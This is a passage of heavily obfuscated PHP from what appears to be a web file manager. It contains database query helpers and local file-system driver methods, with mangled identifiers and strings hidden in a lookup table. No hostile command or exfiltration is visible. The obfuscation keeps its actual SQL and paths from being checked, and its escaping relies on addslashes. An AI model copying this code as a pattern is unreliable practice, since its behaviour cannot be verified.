e\x74\141\x62\154\145\137\156\x61\155\145\x20\x3d\x20\x27{$‚¤‘¬±å}\47"; break; case $ª­‘˜Ã¡[994]: $Œ¸°™Şà = $ª­‘˜Ã¡[995] . $‚¤‘¬±å . $ª­‘˜Ã¡[996]; break; case $ª­‘˜Ã¡[976]: case $ª­‘˜Ã¡[978]: $Œ¸°™Şà = $ª­‘˜Ã¡[997] . $ª­‘˜Ã¡[998] . $ª­‘˜Ã¡[999] . strtoupper($‚¤‘¬±å) . $ª­‘˜Ã¡[1000] . strtoupper($‚¤‘¬±å) . $ª­‘˜Ã¡[1001]; break; case $ª­‘˜Ã¡[1002]: $Œ¸°™Şà = $ª­‘˜Ã¡[1003] . $‚¤‘¬±å . $ª­‘˜Ã¡[1004]; break; case $ª­‘˜Ã¡[977]: break; case $ª­‘˜Ã¡[1005]: default: $Œ¸°™Şà = $ª­‘˜Ã¡[1006] . ($this->dbType == $ª­‘˜Ã¡[1005] ? "\140{$‚¤‘¬±å}\140" : $‚¤‘¬±å); } } $âÀêíÃÛ = $this->query($Œ¸°™Şà); $Ï¸ò¬²ç = array(); if ($âÀêíÃÛ) { foreach ($âÀêíÃÛ as $Ğ­¥¼îç => $ª°ã¨ØÜ) { $ª°ã¨ØÜ = array_change_key_case($ª°ã¨ØÜ); $ª°ã¨ØÜ[$ª­‘˜Ã¡[32]] = isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[32]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[32]] : $ª­‘˜Ã¡[454]; $ª°ã¨ØÜ[$ª­‘˜Ã¡[33]] = isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[33]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[33]] : $ª­‘˜Ã¡[454]; $Ñ ŠœÊÊ = isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[350]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[350]] : $ª°ã¨ØÜ[$ª­‘˜Ã¡[32]]; $Ï¸ò¬²ç[$Ñ ŠœÊÊ] = array($ª­‘˜Ã¡[32] => $Ñ ŠœÊÊ, $ª­‘˜Ã¡[33] => $ª°ã¨ØÜ[$ª­‘˜Ã¡[33]], $ª­‘˜Ã¡[35] => (bool) (isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[106]]) && $ª°ã¨ØÜ[$ª­‘˜Ã¡[106]] === $ª­‘˜Ã¡[12] || isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[35]]) && $ª°ã¨ØÜ[$ª­‘˜Ã¡[35]] === $ª­‘˜Ã¡[12]), $ª­‘˜Ã¡[37] => isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[37]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[37]] : (isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[56]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[56]] : $ª­‘˜Ã¡[454]), $ª­‘˜Ã¡[39] => isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[97]]) ? strtolower($ª°ã¨ØÜ[$ª­‘˜Ã¡[97]]) == $ª­‘˜Ã¡[41] : (isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[57]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[57]] : !1), $ª­‘˜Ã¡[42] => isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[1007]]) ? strtolower($ª°ã¨ØÜ[$ª­‘˜Ã¡[1007]]) == $ª­‘˜Ã¡[44] : (isset($ª°ã¨ØÜ[$ª­‘˜Ã¡[97]]) ? $ª°ã¨ØÜ[$ª­‘˜Ã¡[97]] : !1)); } } return $Ï¸ò¬²ç; } public function getTables($˜á£Ô÷¥ = '') { $ÂäûËó =& $_SERVER[‹è™Ü¸Ñ]; if (think_config($ÂäûËó[1008])) { $ëû °—¦ = str_replace($ÂäûËó[1009], $˜á£Ô÷¥, think_config($ÂäûËó[1008])); } else { switch ($this->dbType) { case $ÂäûËó[976]: case $ÂäûËó[978]: $ëû °—¦ = $ÂäûËó[1010]; break; case $ÂäûËó[975]: case $ÂäûËó[993]: $ëû °—¦ = $ÂäûËó[1011]; break; case $ÂäûËó[1002]: $ëû °—¦ = $ÂäûËó[1012]; break; case $ÂäûËó[977]: think_exception(think_lang($ÂäûËó[1013]) . $ÂäûËó[1014]); break; case $ÂäûËó[994]: $ëû °—¦ = $ÂäûËó[45] . $ÂäûËó[46] . $ÂäûËó[47]; break; case $ÂäûËó[1005]: default: if (!empty($˜á£Ô÷¥)) { $ëû °—¦ = $ÂäûËó[957] . $˜á£Ô÷¥ . $ÂäûËó[958]; } else { $ëû °—¦ = $ÂäûËó[959]; } } } $ì‹¿ºÏ = $this->query($ëû °—¦); $«Ÿ¨®·ì = array(); foreach ($ì‹¿ºÏ as $Üİ—¿ıî => $¿ˆÒ ã¥) { $«Ÿ¨®·ì[$Üİ—¿ıî] = current($¿ˆÒ ã¥); } return $«Ÿ¨®·ì; } protected function parseLimit($Ñè‰Ëéê) { $‡ÓÌá„Ò =& $_SERVER[‹è™Ü¸Ñ]; $…‡ĞÏû = $‡ÓÌá„Ò[12]; if (!empty($Ñè‰Ëéê)) { switch ($this->dbType) { case $‡ÓÌá„Ò[1002]: case $‡ÓÌá„Ò[994]: $Ñè‰Ëéê = explode($‡ÓÌá„Ò[50], $Ñè‰Ëéê); if (count($Ñè‰Ëéê) > 1) { $…‡ĞÏû .= $‡ÓÌá„Ò[51] . $Ñè‰Ëéê[1] . $‡ÓÌá„Ò[52] . $Ñè‰Ëéê[0] . $‡ÓÌá„Ò[53]; } else { $…‡ĞÏû .= $‡ÓÌá„Ò[51] . $Ñè‰Ëéê[0] . $‡ÓÌá„Ò[53]; } break; case $‡ÓÌá„Ò[975]: case $‡ÓÌá„Ò[993]: break; case $‡ÓÌá„Ò[977]: break; case $‡ÓÌá„Ò[976]: case $‡ÓÌá„Ò[978]: break; case $‡ÓÌá„Ò[1005]: default: $…‡ĞÏû .= $‡ÓÌá„Ò[51] . $Ñè‰Ëéê . $‡ÓÌá„Ò[53]; } } return $…‡ĞÏû; } public function parseKey(&$«Í½š„¶, $¥±ÅÊ = true) { $Ÿş òÎ =& $_SERVER[‹è™Ü¸Ñ]; if ($¥±ÅÊ) { $«Í½š„¶ = $this->parseKeyCheck($«Í½š„¶); } if ($this->dbType == $Ÿş òÎ[1005]) { if ($«Í½š„¶ != $Ÿş òÎ[220] && !preg_match($Ÿş òÎ[969], $«Í½š„¶)) { $«Í½š„¶ = $Ÿş òÎ[461] . trim($«Í½š„¶, $Ÿş òÎ[461]) . $Ÿş òÎ[461]; } return $«Í½š„¶; } else { return parent::parseKey($«Í½š„¶, $¥±ÅÊ); } } public function close() { $this->_linkID = null; } public function error() { $Æ¾ç®™í =& $_SERVER[‹è™Ü¸Ñ]; if ($this->PDOStatement) { $Äø“±åı = $this->PDOStatement->errorInfo(); $this->error = $Äø“±åı[1] . $Æ¾ç®™í[4] . $Äø“±åı[2]; } else { $this->error = $Æ¾ç®™í[12]; } if ($Æ¾ç®™í[12] != $this->queryStr) { $this->error .= LNG($Æ¾ç®™í[48]) . $this->queryStr; } think_trace($this->error, $Æ¾ç®™í[12], $Æ¾ç®™í[49]); return $this->error; } public function escapeString($ŸİÏš’ï) { $ÌÜç¦Ñ‘ =& $_SERVER[‹è™Ü¸Ñ]; switch ($this->dbType) { case $ÌÜç¦Ñ‘[1002]: case $ÌÜç¦Ñ‘[975]: case $ÌÜç¦Ñ‘[993]: case $ÌÜç¦Ñ‘[1005]: return addslashes($ŸİÏš’ï); case $ÌÜç¦Ñ‘[977]: case $ÌÜç¦Ñ‘[994]: case $ÌÜç¦Ñ‘[976]: case $ÌÜç¦Ñ‘[978]: return str_ireplace($ÌÜç¦Ñ‘[58], $ÌÜç¦Ñ‘[59], $ŸİÏš’ï); } } protected function parseValue($×ß¨œ´Î) { $îÛæÓ÷† =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($×ß¨œ´Î)) { $‚•”§ğå = strpos($×ß¨œ´Î, $îÛæÓ÷†[4]) === 0 && in_array($×ß¨œ´Î, array_keys($this->bind)); $×ß¨œ´Î = $‚•”§ğå ? $this->escapeString($×ß¨œ´Î) : $îÛæÓ÷†[1015] . $this->escapeString($×ß¨œ´Î) . $îÛæÓ÷†[1015]; } elseif (isset($×ß¨œ´Î[0]) && is_string($×ß¨œ´Î[0]) && strtolower($×ß¨œ´Î[0]) == $îÛæÓ÷†[373]) { $×ß¨œ´Î = $this->escapeString($×ß¨œ´Î[1]); } elseif (is_array($×ß¨œ´Î)) { $×ß¨œ´Î = array_map(array($this, $îÛæÓ÷†[1016]), $×ß¨œ´Î); } elseif (is_bool($×ß¨œ´Î)) { $×ß¨œ´Î = $×ß¨œ´Î ? $îÛæÓ÷†[91] : $îÛæÓ÷†[228]; } elseif (is_null($×ß¨œ´Î)) { $×ß¨œ´Î = $îÛæÓ÷†[106]; } return $×ß¨œ´Î; } public function getLastInsertId() { $¤Ş›òğÓ =& $_SERVER[‹è™Ü¸Ñ]; switch ($this->dbType) { case $¤Ş›òğÓ[1002]: case $¤Ş›òğÓ[994]: case $¤Ş›òğÓ[975]: case $¤Ş›òğÓ[993]: case $¤Ş›òğÓ[977]: case $¤Ş›òğÓ[1005]: return $this->_linkID->lastInsertId(); case $¤Ş›òğÓ[976]: case $¤Ş›òğÓ[978]: $ä²Ó‹¢É = $this->table; $ò‹çûãÓ = $this->query("\x53\105\114\105\103\124\x20{$ä²Ó‹¢É}\x2e\143\165\x72\x72\x76\x61\x6c\x20\143\x75\162\162\166\x61\154\x20\x46\122\117\x4d\x20\144\165\x61\x6c"); return $ò‹çûãÓ ? $ò‹çûãÓ[0][$¤Ş›òğÓ[1017]] : 0; } } } goto C¾Ïƒì— Ä; CšÅÛÎ°«î: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($”öÅ¾ºÚ) { parent::__construct($”öÅ¾ºÚ); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } public function uploadLink($ÓÅÔ¶ãÖ, $Ø‘€Ì‚ù = 0) { $°¹èğÜü =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isUploadServer()) { return; } $ÉÑè„Ó = $this->getType(); if (!in_array($ÉÑè„Ó, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $È®Àˆø¸ = (!$Ø‘€Ì‚ù ? 1 : ceil($Ø‘€Ì‚ù / pow(1024, 3))) * 3600 * 4; $ëÌ = $this->multiUploadFormData($ÓÅÔ¶ãÖ, $È®Àˆø¸); if ($ëÌ) { $ëÌ[$°¹èğÜü[97]] = $ÓÅÔ¶ãÖ; $ëÌ[$°¹èğÜü[98]] = $ÉÑè„Ó; } return $ëÌ; } public function fileOutImage($ãÚµáûå, $æĞŒĞÏ = 250) { if ($this->size($ãÚµáûå) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ãÚµáûå, $æĞŒĞÏ); } $â’˜ä¾ = $this->link($ãÚµáûå); $â’˜ä¾ .= $_SERVER[‹è™Ü¸Ñ][1431] . $æĞŒĞÏ; $this->fileOutLink($â’˜ä¾); } public function fileOutLink($³©©›ç¾) { $ºıü³ê† =& $_SERVER[‹è™Ü¸Ñ]; if (substr($³©©›ç¾, 0, 7) == $ºıü³ê†[313]) { $³©©›ç¾ = $ºıü³ê†[314] . substr($³©©›ç¾, 7); } header($ºıü³ê†[175] . $³©©›ç¾); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ßœí„¬Á) { if (substr($ßœí„¬Á, 0, 2) == $_SERVER[‹è™Ü¸Ñ][1390]) { $ßœí„¬Á = BASIC_PATH . substr($ßœí„¬Á, 2); } return $ßœí„¬Á; } public function iconvApp($§ÛœÆÜ) { $¬şõŒÌ =& $_SERVER[‹è™Ü¸Ñ]; global $config; return $this->iconvTo($§ÛœÆÜ, $config[$¬şõŒÌ[1417]], $config[$¬şõŒÌ[1416]]); } public function iconvSystem($¶ø÷­ÈÖ) { $Î˜Şİ¤® =& $_SERVER[‹è™Ü¸Ñ]; global $config; return $this->iconvTo($¶ø÷­ÈÖ, $config[$Î˜Şİ¤®[1416]], $config[$Î˜Şİ¤®[1417]]); } public function getPathOuter($óå¤ù) { $œĞç¦å¡ =& $_SERVER[‹è™Ü¸Ñ]; $î·ÇÛÍš = $this->iconvApp($this->pathBase); $óå¤ù = $this->iconvApp($óå¤ù); if (substr($î·ÇÛÍš, 0, 2) == $œĞç¦å¡[1390]) { $î·ÇÛÍš = BASIC_PATH . substr($î·ÇÛÍš, 2); } if (substr($óå¤ù, 0, 2) == $œĞç¦å¡[1390]) { $óå¤ù = BASIC_PATH . substr($óå¤ù, 2); } $î·ÇÛÍš = KodIO::clear($î·ÇÛÍš); $óå¤ù = KodIO::clear($óå¤ù); $óå¤ù = substr($óå¤ù, strlen($î·ÇÛÍš)); if (empty($this->pathDriver)) { return $óå¤ù; } return $this->pathDriver . $œĞç¦å¡[8] . ltrim($óå¤ù, $œĞç¦å¡[8]); } public function mkfile($±ÕÀ®éµ, $ÍÖãÛ² = '', $ğï´Ñ = REPEAT_RENAME) { $±ÕÀ®éµ = $this->iconvSystem($±ÕÀ®éµ); @touch($±ÕÀ®éµ); if ($ÍÖãÛ²) { file_put_contents($±ÕÀ®éµ, $ÍÖãÛ²); } @chmod($±ÕÀ®éµ, $this->pathAuth); if (is_file($±ÕÀ®éµ)) { return $this->getPathOuter($±ÕÀ®éµ); } $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } public function mkdir($ç‘°Øæ×, $ÅøÎÚ‡› = REPEAT_SKIP) { $ç‘°Øæ× = $this->iconvSystem($ç‘°Øæ×); if (is_dir($ç‘°Øæ×)) { return $this->getPathOuter($ç‘°Øæ×); } @mkdir($ç‘°Øæ×, $this->pathAuth, !0); @chmod($ç‘°Øæ×, $this->pathAuth); if (is_dir($ç‘°Øæ×)) { return $this->getPathOuter($ç‘°Øæ×); } $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } public function copyFile($µÜê‘ì‹, $Âû­‡Ó) { $this->mkdir($this->pathFather($Âû­‡Ó)); $µÜê‘ì‹ = $this->iconvSystem($µÜê‘ì‹); $Âû­‡Ó = $this->iconvSystem($Âû­‡Ó); $”‘Êˆ•É = copy_64($µÜê‘ì‹, $Âû­‡Ó); @chmod($Âû­‡Ó, $this->pathAuth); if ($”‘Êˆ•É) { return $this->getPathOuter($Âû­‡Ó); } $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } public function moveFile($ˆ–¢±´, $¥ÕìÜÉ„) { $this->mkdir($this->pathFather($¥ÕìÜÉ„)); $ˆ–¢±´ = $this->iconvSystem($ˆ–¢±´); $¥ÕìÜÉ„ = $this->iconvSystem($¥ÕìÜÉ„); $çºô‘ö‰ = intval(@rename($ˆ–¢±´, $¥ÕìÜÉ„)); if (!$çºô‘ö‰) { if ($çºô‘ö‰ = intval(@copy_64($ˆ–¢±´, $¥ÕìÜÉ„))) { @unlink($ˆ–¢±´); } } @chmod($¥ÕìÜÉ„, $this->pathAuth); if ($çºô‘ö‰) { return $this->getPathOuter($¥ÕìÜÉ„); } $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } public function movePath($š­®šÃ¬, $©ŞÂ¸ç§, $¨°ë™ğÄ = false) { $£îÍ€ =& $_SERVER[‹è™Ü¸Ñ]; $š­®šÃ¬ = $this->iconvSystem($š­®šÃ¬); $©ŞÂ¸ç§ = $this->iconvSystem($©ŞÂ¸ç§); $Îîò·û‰ = rtrim($©ŞÂ¸ç§, $£îÍ€[8]) . $£îÍ€[8] . ($¨°ë™ğÄ ? $¨°ë™ğÄ : get_path_this($š­®šÃ¬)); if (file_exists($Îîò·û‰)) { return !1; } $£¨øïà„ = intval(@rename($š­®šÃ¬, $Îîò·û‰)); $£¨øïà„ = file_exists($Îîò·û‰); if ($£¨øïà„) { return $this->getPathOuter($Îîò·û‰); } $this->writeLog(__FUNCTION__ . $£îÍ€[1428], !0); return !1; } public function delFile($×Åà¸¿) { $×Åà¸¿ = $this->iconvSystem($×Åà¸¿); if (!@unlink($×Åà¸¿)) { @chmod($×Åà¸¿, $this->pathAuth); if (@unlink($×Åà¸¿)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } return !0; } public function delFolder($š›§“ ¾) { $–ëšºÌ¶ =& $_SERVER[‹è™Ü¸Ñ]; $š›§“ ¾ = $this->iconvSystem($š›§“ ¾); if (!is_dir($š›§“ ¾)) { return !0; } if (!($Í´åİ—ş = opendir($š›§“ ¾))) { return !1; } while (($’æµ„é– = readdir($Í´åİ—ş)) !== !1) { if ($’æµ„é– == $–ëšºÌ¶[10] || $’æµ„é– == $–ëšºÌ¶[1343]) { continue; } $òÚù¼Û = $š›§“ ¾ . $–ëšºÌ¶[8] . $’æµ„é–; if (is_file($òÚù¼Û) || is_link($òÚù¼Û)) { if (!unlink($òÚù¼Û)) { chmod($òÚù¼Û, $this->pathAuth); if (!unlink($òÚù¼Û)) { return !1; } } } else { if (is_dir($òÚù¼Û)) { chmod($òÚù¼Û, $this->pathAuth); $òÚù¼Û = $this->iconvApp($òÚù¼Û); if (!$this->delFolder($òÚù¼Û)) { return !1; } } } } closedir($Í´åİ—ş); return rmdir($š›§“ ¾); } public function rename($¢ç®í³è, $‚ö¶»à) { $›Ùèƒá =& $_SERVER[‹è™Ü¸Ñ]; $Ó¢¤íâë = $this->fileNameAuto($this->pathFather($¢ç®í³è), $‚ö¶»à); $Ó¢¤íâë = $this->iconvSystem($Ó¢¤íâë); $¢ç®í³è = $this->iconvSystem($¢ç®í³è); $‚«§óĞ = $this->pathFather($¢ç®í³è); $æş•«¡Á = rtrim($‚«§óĞ, $›Ùèƒá[8]) . $›Ùèƒá[8] . $Ó¢¤íâë; $Š¯ùÇäÂ = @rename($¢ç®í³è, $æş•«¡Á); $æş•«¡Á = $this->iconvApp($æş•«¡Á); if ($Š¯ùÇäÂ) { return $this->getPathOuter($æş•«¡Á); } $this->writeLog(__FUNCTION__ . $›Ùèƒá[1428], !0); return !1; } public function size($¦«†ÖŸÅ) { $¦«†ÖŸÅ = $this->iconvSystem($¦«†ÖŸÅ); return filesize_64($¦«†ÖŸÅ); } public function info($ˆ„ôâ©) { $ˆ„ôâ© = $this->iconvSystem($ˆ„ôâ©); if ($this->isFolder($ˆ„ôâ©)) { return $this->folderInfo($ˆ„ôâ©); } else { if ($this->isFile($ˆ„ôâ©)) { return $this->fileInfo($ˆ„ôâ©); } } return !1; } protected function infoChildren($ïÜ«öÕ¼, &$Á–¬æë›, $ïÊ¢øÅ¾ = true) { $ÒÍ„¬³¸ =& $_SERVER[‹è™Ü¸Ñ]; check_abort_echo(); $ïÜ«öÕ¼ = rtrim($ïÜ«öÕ¼, $ÒÍ„¬³¸[8]) . $ÒÍ„¬³¸[8]; if ($ïÊ¢øÅ¾) { $ïÜ«öÕ¼ = $this->iconvSystem($ïÜ«öÕ¼); } if (!($ò–áåÌ = @opendir($ïÜ«öÕ¼))) { return; } while (($ˆÏ¸Ğöø = readdir($ò–áåÌ)) !== !1) { if ($ˆÏ¸Ğöø == $ÒÍ„¬³¸[10] || $ˆÏ¸Ğöø == $ÒÍ„¬³¸[1343]) { continue; } $€¯Ä‘©Ü = $ïÜ«öÕ¼ . $ˆÏ¸Ğöø; if (is_file($€¯Ä‘©Ü) || is_link($€¯Ä‘©Ü)) { $Á–¬æë›[$ÒÍ„¬³¸[80]]++; $Á–¬æë›[$ÒÍ„¬³¸[79]] += filesize_64($€¯Ä‘©Ü); } else { if (is_dir($€¯Ä‘©Ü)) { $Á–¬æë›[$ÒÍ„¬³¸[81]]++; $this->infoChildren($€¯Ä‘©Ü, $Á–¬æë›, !1); } } } closedir($ò–áåÌ); } private function folderInfo($‡•¤Õ§ü, $şº‡¥„ = false) { $Òãî¢â =& $_SERVER[‹è™Ü¸Ñ]; $‡•¤Õ§ü = rtrim($‡•¤Õ§ü, $Òãî¢â[8]) . $Òãî¢â[8]; $à•áËÛ = $this->iconvApp($this->pathThis($‡•¤Õ§ü)); if ($şº‡¥„) { return array($Òãî¢â[32] => $à•áËÛ, $Òãî¢â[87] => $this->getPathOuter($‡•¤Õ§ü), $Òãî¢â[33] => $Òãî¢â[78]); } $ŸÅè¹ë = array($Òãî¢â[32] => $à•áËÛ, $Òãî¢â[87] => $this->getPathOuter($‡•¤Õ§ü), $Òãî¢â[33] => $Òãî¢â[78], $Òãî¢â[231] => @filectime($‡•¤Õ§ü), $Òãî¢â[88] => @filemtime($‡•¤Õ§ü), $Òãî¢â[1432] => @fileatime($‡•¤Õ§ü), $Òãî¢â[1433] => is_readable($‡•¤Õ§ü), $Òãî¢â[1434] => is_writable($‡•¤Õ§ü), $Òãî¢â[1435] => get_mode($‡•¤Õ§ü)); return $ŸÅè¹ë; } private function fileInfo($ˆ×‘Âö‡, $Éï Ëìı = false) { $š‹› ˜‹ =& $_SERVER[‹è™Ü¸Ñ]; $»±…ìÊœ = $this->iconvApp($this->pathThis($ˆ×‘Âö‡)); if ($Éï Ëìı) { return array($š‹› ˜‹[32] => $»±…ìÊœ, $š‹› ˜‹[87] => $this->getPathOuter($ˆ×‘Âö‡), $š‹› ˜‹[33] => $š‹› ˜‹[230], $š‹› ˜‹[79] => $this->size($ˆ×‘Âö‡), $š‹› ˜‹[169] => $this->ext($»±…ìÊœ)); } $°¾è¸µÅ = array($š‹› ˜‹[32] => $»±…ìÊœ, $š‹› ˜‹[87] => $this->getPathOuter($ˆ×‘Âö‡), $š‹› ˜‹[33] => $š‹› ˜‹[230], $š‹› ˜‹[231] => @filectime($ˆ×‘Âö‡), $š‹› ˜‹[88] => @filemtime($ˆ×‘Âö‡), $š‹› ˜‹[1432] => @fileatime($ˆ×‘Âö‡), $š‹› ˜‹[79] => $this->size($ˆ×‘Âö‡), $š‹› ˜‹[169] => $this->ext($»±…ìÊœ), $š‹› ˜‹[1433] => is_readable($ˆ×‘Âö‡), $š‹› ˜‹[1434] => is_writable($ˆ×‘Âö‡), $š‹› ˜‹[1435] => get_mode($ˆ×‘Âö‡)); return $°¾è¸µÅ; } public function exist($İÏÃ³ƒ) { $İÏÃ³ƒ = $this->iconvSystem($İÏÃ³ƒ); return @file_exists($İÏÃ³ƒ); } public function isFile($€á×Æ¸ä) { $€á×Æ¸ä = $this->iconvSystem($€á×Æ¸ä); return @is_file($€á×Æ¸ä); } public function isFolder($Ô™ÛŸ®Ø) { $Ô™ÛŸ®Ø = $this->iconvSystem($Ô™ÛŸ®Ø); return @is_dir($Ô™ÛŸ®Ø); } public function listPath($°ÛŸü«€, $Ôã‰àÕ = false) { $ÖŞ ï¹Ã =& $_SERVER[‹è™Ü¸Ñ]; $°ÛŸü«€ = $this->iconvSystem($°ÛŸü«€); $°ÛŸü«€ = rtrim($°ÛŸü«€, $ÖŞ ï¹Ã[8]) . $ÖŞ ï¹Ã[8]; $ö‚—‡¯¥ = array($ÖŞ ï¹Ã[85] => array(), $ÖŞ ï¹Ã[86] => array()); if (!($Ò€ò©‘Ğ = @opendir($°ÛŸü«€))) { return $ö‚—‡¯¥; } while (($®š¥¬©Û = readdir($Ò€ò©‘Ğ)) !== !1) { if ($®š¥¬©Û == $ÖŞ ï¹Ã[10] || $®š¥¬©Û == $ÖŞ ï¹Ã[1343]) { continue; } $Ş´‰ßóí = $°ÛŸü«€ . $®š¥¬©Û; if (is_file($Ş´‰ßóí)) { $ö‚—‡¯¥[$ÖŞ ï¹Ã[86]][] = $this->fileInfo($Ş´‰ßóí, $Ôã‰àÕ); } else { $ö‚—‡¯¥[$ÖŞ ï¹Ã[85]][] = $this->folderInfo($Ş´‰ßóí, $Ôã‰àÕ); } } closedir($Ò€ò©‘Ğ); return $ö‚—‡¯¥; } public function listAll($€ØÓñ, &$’ØÑğ‡ = array()) { $¡¥ÏÙğè =& $_SERVER[‹è™Ü¸Ñ]; $€ØÓñ = $this->iconvSystem($€ØÓñ); $€ØÓñ = rtrim($€ØÓñ, $¡¥ÏÙğè[8]) . $¡¥ÏÙğè[8]; if (!($áÁ‚¨ÜÌ = @opendir($€ØÓñ))) { return $’ØÑğ‡; } while (($ÑÏÃàñù = readdir($áÁ‚¨ÜÌ)) !== !1) { if ($ÑÏÃàñù == $¡¥ÏÙğè[10] || $ÑÏÃàñù == $¡¥ÏÙğè[1343]) { continue; } $ÀŒ¨Ê–Ñ = $€ØÓñ . $ÑÏÃàñù; $‚öà¨—ú = is_dir($ÀŒ¨Ê–Ñ) && !is_link($ÀŒ¨Ê–Ñ) ? 1 : 0; $ÀŒ¨Ê–Ñ = $‚öà¨—ú ? $ÀŒ¨Ê–Ñ . $¡¥ÏÙğè[8] : $ÀŒ¨Ê–Ñ; $’ØÑğ‡[] = array($¡¥ÏÙğè[87] => $ÀŒ¨Ê–Ñ, $¡¥ÏÙğè[78] => $‚öà¨—ú, $¡¥ÏÙğè[88] => intval(@filemtime($ÀŒ¨Ê–Ñ)), $¡¥ÏÙğè[79] => $‚öà¨—ú ? 0 : intval($this->size($ÀŒ¨Ê–Ñ))); if ($‚öà¨—ú) { $this->listAll($ÀŒ¨Ê–Ñ, $’ØÑğ‡); } } closedir($áÁ‚¨ÜÌ); return $’ØÑğ‡; } public function has($ŞÊ…©Ò, $Œ©Ãâ–´ = false, $ÜŸöÃ½ = true) { $´Ë¹±£ç =& $_SERVER[‹è™Ü¸Ñ]; $ŞÊ…©Ò = $this->iconvSystem($ŞÊ…©Ò); $ŞÊ…©Ò = rtrim($ŞÊ…©Ò, $´Ë¹±£ç[8]) . $´Ë¹±£ç[8]; if (!($Ï¨ÑÀöÑ = @opendir($ŞÊ…©Ò))) { return !1; } $å¿©ÔÖ = 0; $ƒ”éÆü = 0; $áóÑ»ÎÚ = 0; while (($—õçöç© = readdir($Ï¨ÑÀöÑ)) !== !1) { if ($—õçöç© == $´Ë¹±£ç[10] || $—õçöç© == $´Ë¹±£ç[1343]) { continue; } $ÅİáÔÇ‘ = $ŞÊ…©Ò . $—õçöç©; if ($Œ©Ãâ–´) { $áóÑ»ÎÚ++; if (@is_file($ÅİáÔÇ‘)) { $å¿©ÔÖ++; } else { $ƒ”éÆü++; } if ($áóÑ»ÎÚ > 10000) { break; } continue; } if ($ÜŸöÃ½) { if (@is_file($ÅİáÔÇ‘)) { return !0; } } else { if (@is_dir($ÅİáÔÇ‘ . $´Ë¹±£ç[8])) { return !0; } } } closedir($Ï¨ÑÀöÑ); if ($Œ©Ãâ–´) { return array($´Ë¹±£ç[239] => $å¿©ÔÖ, $´Ë¹±£ç[240] => $ƒ”éÆü); } return !1; } public function hashSimple($åº¸ŞÅß) { $Ù¼¤àæ =& $_SERVER[‹è™Ü¸Ñ]; if (!$åº¸ŞÅß) { return md5($Ù¼¤àæ[12]); } $åº¸ŞÅß = $this->iconvSystem($åº¸ŞÅß); $¬Ê°”ñ = $this->size($åº¸ŞÅß); $ß–¿Á¹Í = 200; $¸¤±öµ = 50; if ($¬Ê°”ñ <= $ß–¿Á¹Í * $¸¤±öµ) { return $this->hashMd5($åº¸ŞÅß) . $¬Ê°”ñ; } $ô“‘¬Èä = $Ù¼¤àæ[12]; $Îš£Å¿Í = intval($¬Ê°”ñ / $¸¤±öµ); $³…•ôšİ = fopen($åº¸ŞÅß, $Ù¼¤àæ[1436]); if (!$³…•ôšİ) { return $ô“‘¬Èä; } for ($û÷Ø”ò² = 0; $û÷Ø”ò² < $¸¤±öµ; $û÷Ø”ò²++) { fseek_64($³…•ôšİ, $Îš£Å¿Í * $û÷Ø”ò²); $ô“‘¬Èä .= fread($³…•ôšİ, $ß–¿Á¹Í); } fseek_64($³…•ôšİ, $¬Ê°”ñ - $ß–¿Á¹Í); $ô“‘¬Èä .= fread($³…•ôšİ, $ß–¿Á¹Í); fclose($³…•ôšİ); return md5($ô“‘¬Èä) . $¬Ê°”ñ; } public function getContent($şğóÈ½§) { $şğóÈ½§ = $this->iconvSystem($şğóÈ½§); return file_get_contents($şğóÈ½§); } public function setContent($¢şÓıÍ, $¬ê¯èƒí = '') { $¢şÓıÍ = $this->iconvSystem($¢şÓıÍ); $–¹¦—š = @file_put_contents($¢şÓıÍ, $¬ê¯èƒí, LOCK_EX); if (!$–¹¦—š) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); } clearstatcache(); @chmod($¢şÓıÍ, $this->pathAuth); return $–¹¦—š === !1 ? !1 : !0; } public function fileSubstr($”×ü÷ğ®, $’ÔªûêÃ = 0, $Çá”•Ø = false) { $Ã¡ÙÎÍ› =& $_SERVER[‹è™Ü¸Ñ]; $”×ü÷ğ® = $this->iconvSystem($”×ü÷ğ®); if ($Çá”•Ø === !1) { $Çá”•Ø = $this->size($”×ü÷ğ®); } if ($Çá”•Ø <= 0) { return $Ã¡ÙÎÍ›[12]; } $£¤ŞşÏ§ = fopen($”×ü÷ğ®, $Ã¡ÙÎÍ›[1436]); if (!$£¤ŞşÏ§) { return !1; } fseek_64($£¤ŞşÏ§, $’ÔªûêÃ); $¥±¯òÏº = fread($£¤ŞşÏ§, $Çá”•Ø); fclose($£¤ŞşÏ§); if (!$¥±¯òÏº) { $this->writeLog(__FUNCTION__ . $Ã¡ÙÎÍ›[1428], !0); } return $¥±¯òÏº; } public function upload($•ŒŸ• , $ë•È‡, $‰ÉÄèß„ = false, $Í˜Ä§­Î = REPEAT_REPLACE) { if 